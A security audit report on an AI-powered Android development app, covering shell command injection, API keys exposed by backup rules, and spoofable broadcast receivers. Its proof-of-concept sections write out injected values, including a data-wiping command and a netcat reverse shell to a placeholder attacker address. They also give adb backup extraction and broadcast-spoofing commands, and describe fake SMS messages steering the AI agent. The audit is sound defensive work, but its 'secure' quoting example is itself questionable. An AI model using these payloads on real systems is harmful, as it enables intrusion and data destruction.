# 🛡️ OmniDev Workspace - Security Audit Report (Mythos-Sec)

## 1. Executive Summary
This authorized, white-box security audit of the OmniDev Workspace architecture and source code revealed multiple high-severity vulnerabilities. As an AI-driven, highly privileged Android development environment, OmniDev Workspace introduces an expansive attack surface spanning deep system integrations (Shizuku, ADB shell, Termux) and persistent background services.

The most critical findings involve **Command Injection / Remote Code Execution (RCE)** vectors through insecure handling of external strings passed directly to POSIX shells via `ProcessBuilder` and `Runtime.getRuntime().exec()`. Additionally, insecure data storage practices leave critical API keys and session tokens vulnerable to extraction via Android Auto Backup. Lastly, exported broadcast receivers lack requisite intent permissions, exposing the application to intent spoofing by malicious, unprivileged applications co-resident on the device.

Immediate remediation is required to harden the application against privilege escalation and lateral movement.

## 2. Threat Matrix & Vulnerability Ranking

| Vulnerability Name | Severity | CVSS 3.1 Score | Component Affected |
| :--- | :--- | :--- | :--- |
| Command Injection via ProcessBuilder / Runtime.exec() | Critical | 9.8 (CRITICAL) | `FileToolManager`, `ShizukuCommandTool`, `PrivilegedExecutionFacadeBootstrap` |
| Plaintext Credentials / Insecure Backup Rules | High | 7.5 (HIGH) | `ApiKeyRepository`, `backup_rules.xml`, `data_extraction_rules.xml` |
| Intent Spoofing via Unprotected Broadcast Receivers | Medium | 5.5 (MEDIUM) | `OmniSmsReceiver`, `BootReceiver` |

---

## 3. Detailed Vulnerability Findings

### Finding 1: Command Injection via ProcessBuilder & Runtime.exec()
*   **Severity:** Critical
*   **CVSS 3.1 Score:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
*   **Description:** The application frequently executes shell commands to perform deep system tasks. In multiple locations (`FileToolManager.kt`, `PrivilegedExecutionFacadeBootstrap.kt`), raw command strings, potentially originating from external inputs or AI-generated output, are passed directly to `sh -c` without adequate sanitization or tokenization. For example, `FileToolManager` uses `ProcessBuilder("/bin/sh", "-c", command)`. `PrivilegedExecutionManager` exposes a `shellQuote` method, but it is not universally applied. Furthermore, the fallback in `ShizukuCommandTool` executes `Runtime.getRuntime().exec(arrayOf("sh", "-c", command))`.
*   **Proof of Concept (PoC) / Exploitation Scenario:** If an attacker can manipulate the input string `command` (e.g., via intent parameters, malicious workspace files parsed by the AI agent, or compromised server responses), they can append shell metacharacters. For instance, if `command` is `ls $target_dir`, an attacker setting `$target_dir` to `dir; rm -rf /` or `dir; nc attacker_ip 4444 -e /system/bin/sh` will achieve arbitrary code execution. Since Shizuku or the OEM system UID context executes these commands, the attacker gains near-root or system-level privileges.
*   **Business Impact:** Total system compromise. An attacker can pivot, steal all data, install persistent backdoors, and bypass all Android sandboxing mechanisms.

### Finding 2: Plaintext Credentials & Insecure Backup Rules
*   **Severity:** High
*   **CVSS 3.1 Score:** 7.5 (CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)
*   **Description:** API keys for AI models are stored in a plaintext DataStore (`omnidev_api_keys`). While stored in the app's private directory (`/data/data/...`), the application sets `android:allowBackup="true"` and the extraction/backup rules (`data_extraction_rules.xml` and `backup_rules.xml`) do not explicitly exclude `omnidev_api_keys` or the `copilot_session_secure_v1` encrypted preferences.
*   **Proof of Concept (PoC) / Exploitation Scenario:** An attacker with physical access or a malicious app with ADB debugging access can initiate an ADB backup (`adb backup -f backup.ab com.omnidev.workspace`). The attacker can then use tools like Android Backup Extractor (ABE) to unpack the `.ab` file. The plaintext `omnidev_api_keys` will be fully readable. While `copilot_session_secure_v1` is encrypted, transferring it to another device may either result in a crash due to Keystore mismatch or, if weak key generation is used, allow offline brute-forcing.
*   **Business Impact:** Leakage of highly privileged AI API keys, leading to financial loss, quota exhaustion, and potential compromise of connected cloud services (e.g., GitHub Copilot Enterprise).

### Finding 3: Intent Spoofing via Unprotected Broadcast Receivers
*   **Severity:** Medium
*   **CVSS 3.1 Score:** 5.5 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L)
*   **Description:** `OmniSmsReceiver` is exported (`android:exported="true"`) to receive SMS broadcasts but lacks the required `android:permission="android.permission.BROADCAST_SMS"` enforcement. Similarly, `BootReceiver` is exported but lacks `android:permission="android.permission.RECEIVE_BOOT_COMPLETED"`.
*   **Proof of Concept (PoC) / Exploitation Scenario:** A malicious, zero-permission app installed on the same device can send a spoofed broadcast: `am broadcast -a android.provider.Telephony.SMS_RECEIVED -n com.omnidev.workspace/.data.communication.OmniSmsReceiver`. This injects fabricated SMS messages into the AI's context buffer.
*   **Business Impact:** Context poisoning. The AI agent could be manipulated via fake SMS commands (e.g., "Admin says delete all files"), tricking the autonomous agent into performing destructive actions.

---

## 4. Remediation & Hardening Plan

### 1. Eradicate Command Injection (RCE)
*   **Action:** Ban the use of `sh -c` with concatenated strings.
*   **Patch:** Refactor all `ProcessBuilder` and `Runtime.exec` calls to use array-based argument passing where the command and arguments are strictly separated. If a shell parser is absolutely required, enforce strict POSIX shell quoting using `PrivilegedExecutionManager.shellQuote()`.
*   **Code Example (FileToolManager.kt):**
    ```kotlin
    // VULNERABLE
    // val process = ProcessBuilder("/bin/sh", "-c", command)

    // SECURE (If command is a pre-parsed list of arguments)
    // val process = ProcessBuilder(commandArgsList)

    // SECURE (If a shell is required, quote the arguments)
    val quotedCommand = PrivilegedExecutionManager.shellQuote(command)
    val process = ProcessBuilder("/bin/sh", "-c", quotedCommand)
    ```

### 2. Secure Data Storage & Backup Rules
*   **Action:** Encrypt the API keys DataStore and exclude sensitive files from Auto Backup.
*   **Patch (Android Backup Rules):**
    Update `res/xml/data_extraction_rules.xml`:
    ```xml
    <data-extraction-rules>
        <cloud-backup>
            <exclude domain="file" path="datastore/omnidev_api_keys.preferences_pb"/>
            <exclude domain="sharedpref" path="copilot_session_secure_v1.xml"/>
        </cloud-backup>
        <device-transfer>
            <exclude domain="file" path="datastore/omnidev_api_keys.preferences_pb"/>
            <exclude domain="sharedpref" path="copilot_session_secure_v1.xml"/>
        </device-transfer>
    </data-extraction-rules>
    ```
    Update `res/xml/backup_rules.xml`:
    ```xml
    <full-backup-content>
        <exclude domain="file" path="datastore/omnidev_api_keys.preferences_pb"/>
        <exclude domain="sharedpref" path="copilot_session_secure_v1.xml"/>
    </full-backup-content>
    ```
*   **Patch (ApiKeyRepository.kt):** Migrate `omnidev_api_keys` to use `EncryptedSharedPreferences` or implement an encrypted DataStore using Tink or `androidx.security.crypto`.

### 3. Enforce Broadcast Receiver Permissions
*   **Action:** Restrict IPC access to exported receivers.
*   **Patch:** Update `AndroidManifest.xml` to explicitly require system-level permissions.
    ```xml
    <!-- OmniSmsReceiver -->
    <receiver
        android:name=".data.communication.OmniSmsReceiver"
        android:exported="true"
        android:permission="android.permission.BROADCAST_SMS"
        android:directBootAware="true">
        ...
    </receiver>

    <!-- BootReceiver -->
    <receiver
        android:name=".data.system.BootReceiver"
        android:exported="true"
        android:permission="android.permission.RECEIVE_BOOT_COMPLETED"
        android:directBootAware="true">
        ...
    </receiver>
    ```
